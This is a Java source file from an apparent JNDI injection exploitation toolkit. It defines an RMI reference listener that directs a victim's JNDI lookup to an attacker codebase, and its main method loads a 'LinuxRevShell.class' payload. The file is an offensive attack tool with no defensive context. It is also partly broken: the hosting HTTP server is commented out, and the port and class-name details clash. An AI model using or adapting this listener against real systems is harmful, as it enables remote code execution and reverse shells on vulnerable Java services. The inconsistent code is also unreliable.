package cn.org.unk.JNDI;

import cn.org.unk.Util;

import javax.naming.InitialContext;
import java.io.IOException;
import java.net.URL;
import java.util.HashMap;

public class RMIRefAttackListener {

    private int rmiServerPort;
    private int httpServerPort;
    private String httpServerAddr;
    private byte[] evilByte;

    // evilClassName example: Evil
    private String evilClassName;


    public RMIRefAttackListener(int rmiServerPort, int httpServerPort, String httpServerAddr, byte[] evilByte, String evilClassName) {
        this.rmiServerPort = rmiServerPort;
        this.httpServerPort = httpServerPort;
        this.httpServerAddr = httpServerAddr;
        this.evilByte = evilByte;
        this.evilClassName = evilClassName;
    }

    public void listen() throws Exception{

        new Thread(()->{
            HashMap<String, byte[]> hashMap = new HashMap<>();
            hashMap.put(String.format("/%s.class",evilClassName),evilByte);
            //System.out.println(String.format("[+] Running HttpServer on http://%s:%s",httpServerAddr,httpServerPort));
            //new HttpServer(httpServerPort,hashMap).start();
        }).start();

        Thread.sleep(2*1000);

        new Thread(()->{
            try {
                new RMIRefServer(rmiServerPort,new URL(String.format("http://0.0.0.0:%s/#%s",rmiServerPort,evilClassName))).run();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }).start();


    }
    public static void main(String[] args) throws Exception{

        new RMIRefAttackListener(1099,24545,"127.0.0.1", Util.file2ByteArray("E:\\ideaProjects\\Java-unser-utils\\target\\classes\\LinuxRevShell.class"),"WinCalc").listen();

        Thread.sleep(2*1000);

    }
}
